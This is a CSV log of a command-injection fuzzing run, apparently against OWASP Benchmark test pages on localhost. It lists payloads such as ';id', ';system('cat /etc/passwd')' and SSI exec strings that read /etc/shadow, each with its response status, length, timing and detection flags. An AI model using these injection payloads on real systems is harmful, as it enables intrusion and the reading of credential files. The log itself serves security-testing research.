id_fuzz,url,payload,method,resp_status_code,resp_content_length,resp_time_elapsed,type_payload,payload,observation_status_code,observation_search_file_not_found,observation_search_no_such_file,observation_search_uid,observation_search_gid,observation_search_groups,observation_search_gpermission_denied,observation_search_whoami,observation_search_root,observation_daemon,observation_error,observation_exception,observation_illegal,observation_invalid,observation_fail,observation_stack,observation_access,observation_directory,observation_not_found,observation_unknown,observation_ODBC,observation_SQL,observation_quotation_mark,observation_syntax,observation_ORA,observation_111111,observation_time_delay,observation_content_length
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,";id
",POST,200,313,0:00:00.002897,cmdi,";id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,"|usr/bin/id
",POST,200,313,0:00:00.002701,cmdi,"|usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,"|nid
",POST,200,313,0:00:00.002615,cmdi,"|nid
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,`id`,POST,200,313,0:00:00.004102,cmdi,`id`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,`/usr/bin/id`,POST,200,313,0:00:00.006020,cmdi,`/usr/bin/id`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a);id,POST,200,313,0:00:00.002228,cmdi,a);id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a;id,POST,200,313,0:00:00.002288,cmdi,a;id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a);id;,POST,200,313,0:00:00.002393,cmdi,a);id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a;id;,POST,200,313,0:00:00.003443,cmdi,a;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a);id|,POST,200,313,0:00:00.014712,cmdi,a);id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a;id|,POST,200,313,0:00:00.002747,cmdi,a;id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a)|id,POST,200,313,0:00:00.002409,cmdi,a)|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a|id,POST,200,313,0:00:00.005368,cmdi,a|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a)|id;,POST,200,313,0:00:00.002542,cmdi,a)|id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a|id,POST,200,313,0:00:00.002885,cmdi,a|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,|/bin/ls -al,POST,200,313,0:00:00.013661,cmdi,|/bin/ls -al,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a);/usr/bin/id,POST,200,313,0:00:00.011452,cmdi,a);/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a;/usr/bin/id,POST,200,313,0:00:00.003817,cmdi,a;/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a);/usr/bin/id;,POST,200,313,0:00:00.007453,cmdi,a);/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a;/usr/bin/id;,POST,200,313,0:00:00.003453,cmdi,a;/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a);/usr/bin/id|,POST,200,313,0:00:00.003383,cmdi,a);/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a;/usr/bin/id|,POST,200,313,0:00:00.005992,cmdi,a;/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a)|/usr/bin/id,POST,200,313,0:00:00.002905,cmdi,a)|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a|/usr/bin/id,POST,200,313,0:00:00.007511,cmdi,a|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a)|/usr/bin/id;,POST,200,313,0:00:00.003033,cmdi,a)|/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,a|/usr/bin/id,POST,200,313,0:00:00.003621,cmdi,a|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,;system('cat%20/etc/passwd'),POST,200,313,0:00:00.006490,cmdi,;system('cat%20/etc/passwd'),200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,;system('id'),POST,200,313,0:00:00.002688,cmdi,;system('id'),200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,;system('/usr/bin/id'),POST,200,313,0:00:00.002489,cmdi,;system('/usr/bin/id'),200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,%0Acat%20/etc/passwd,POST,200,313,0:00:00.002803,cmdi,%0Acat%20/etc/passwd,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,%0A/usr/bin/id,POST,200,313,0:00:00.004241,cmdi,%0A/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,%0Aid,POST,200,313,0:00:00.002747,cmdi,%0Aid,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,%0A/usr/bin/id%0A,POST,200,313,0:00:00.002589,cmdi,%0A/usr/bin/id%0A,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,%0Aid%0A,POST,200,313,0:00:00.003323,cmdi,%0Aid%0A,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,& ping -i 30 127.0.0.1 &,POST,200,313,0:00:00.004147,cmdi,& ping -i 30 127.0.0.1 &,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,& ping -n 30 127.0.0.1 &,POST,200,313,0:00:00.003325,cmdi,& ping -n 30 127.0.0.1 &,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,%0a ping -i 30 127.0.0.1 %0a,POST,200,313,0:00:00.004098,cmdi,%0a ping -i 30 127.0.0.1 %0a,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,`ping 127.0.0.1`,POST,200,313,0:00:00.002161,cmdi,`ping 127.0.0.1`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,| id,POST,200,313,0:00:00.002126,cmdi,| id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,& id,POST,200,313,0:00:00.002249,cmdi,& id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,; id,POST,200,313,0:00:00.002559,cmdi,; id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,%0a id %0a,POST,200,313,0:00:00.027273,cmdi,%0a id %0a,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,`id`,POST,200,313,0:00:00.008024,cmdi,`id`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_2,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00015,$;/usr/bin/id,POST,200,313,0:00:00.004155,cmdi,$;/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,POST,200,310,0:00:00.006117,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,POST,200,310,0:00:00.004034,cmdi,&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,310,0:00:00.002736,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,POST,200,310,0:00:00.003340,cmdi,&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,/index.html|id|,POST,200,310,0:00:00.002423,cmdi,/index.html|id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,;id;,POST,200,310,0:00:00.006818,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,;id,POST,200,310,0:00:00.006128,cmdi,;id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,;netstat -a;,POST,200,310,0:00:00.002839,cmdi,;netstat -a;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,;id;,POST,200,310,0:00:00.003608,cmdi,;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,|id,POST,200,310,0:00:00.002997,cmdi,|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,|/usr/bin/id,POST,200,310,0:00:00.002664,cmdi,|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,|id|,POST,200,310,0:00:00.003539,cmdi,|id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,|/usr/bin/id|,POST,200,310,0:00:00.002845,cmdi,|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,||/usr/bin/id|,POST,200,310,0:00:00.003175,cmdi,||/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,|id;,POST,200,310,0:00:00.003010,cmdi,|id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,||/usr/bin/id;,POST,200,310,0:00:00.005200,cmdi,||/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,;id|,POST,200,310,0:00:00.002187,cmdi,;id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,;|/usr/bin/id|,POST,200,310,0:00:00.002709,cmdi,;|/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,"
/bin/ls -al
",POST,200,310,0:00:00.003062,cmdi,"
/bin/ls -al
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,"
/usr/bin/id
",POST,200,310,0:00:00.003510,cmdi,"
/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,"
id
",POST,200,310,0:00:00.003540,cmdi,"
id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,"
/usr/bin/id;",POST,200,310,0:00:00.003134,cmdi,"
/usr/bin/id;",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,"
id;",POST,200,310,0:00:00.004579,cmdi,"
id;",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,"
/usr/bin/id|",POST,200,310,0:00:00.006791,cmdi,"
/usr/bin/id|",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,"
id|",POST,200,310,0:00:00.009069,cmdi,"
id|",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,";/usr/bin/id
",POST,200,310,0:00:00.003864,cmdi,";/usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,";id
",POST,200,310,0:00:00.002501,cmdi,";id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,"|usr/bin/id
",POST,200,310,0:00:00.002434,cmdi,"|usr/bin/id
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,"|nid
",POST,200,310,0:00:00.012480,cmdi,"|nid
",200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,`id`,POST,200,310,0:00:00.003145,cmdi,`id`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,`/usr/bin/id`,POST,200,310,0:00:00.003548,cmdi,`/usr/bin/id`,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a);id,POST,200,310,0:00:00.005888,cmdi,a);id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a;id,POST,200,310,0:00:00.003475,cmdi,a;id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a);id;,POST,200,310,0:00:00.005553,cmdi,a);id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a;id;,POST,200,310,0:00:00.005113,cmdi,a;id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a);id|,POST,200,310,0:00:00.003696,cmdi,a);id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a;id|,POST,200,310,0:00:00.002794,cmdi,a;id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a)|id,POST,200,310,0:00:00.003908,cmdi,a)|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a|id,POST,200,310,0:00:00.008445,cmdi,a|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a)|id;,POST,200,310,0:00:00.002314,cmdi,a)|id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a|id,POST,200,310,0:00:00.002406,cmdi,a|id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,|/bin/ls -al,POST,200,310,0:00:00.002791,cmdi,|/bin/ls -al,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a);/usr/bin/id,POST,200,310,0:00:00.003691,cmdi,a);/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a;/usr/bin/id,POST,200,310,0:00:00.002900,cmdi,a;/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a);/usr/bin/id;,POST,200,310,0:00:00.004462,cmdi,a);/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a;/usr/bin/id;,POST,200,310,0:00:00.003879,cmdi,a;/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a);/usr/bin/id|,POST,200,310,0:00:00.005464,cmdi,a);/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a;/usr/bin/id|,POST,200,310,0:00:00.004014,cmdi,a;/usr/bin/id|,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a)|/usr/bin/id,POST,200,310,0:00:00.003800,cmdi,a)|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a|/usr/bin/id,POST,200,310,0:00:00.003747,cmdi,a|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a)|/usr/bin/id;,POST,200,310,0:00:00.004420,cmdi,a)|/usr/bin/id;,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,a|/usr/bin/id,POST,200,310,0:00:00.002362,cmdi,a|/usr/bin/id,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,;system('cat%20/etc/passwd'),POST,200,310,0:00:00.003849,cmdi,;system('cat%20/etc/passwd'),200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,;system('id'),POST,200,310,0:00:00.003704,cmdi,;system('id'),200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
id_fuzz_3,https://localhost:8443/benchmark/cmdi-00/BenchmarkTest00051,;system('/usr/bin/id'),POST,200,310,0:00:00.019186,cmdi,;system('/usr/bin/id'),200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
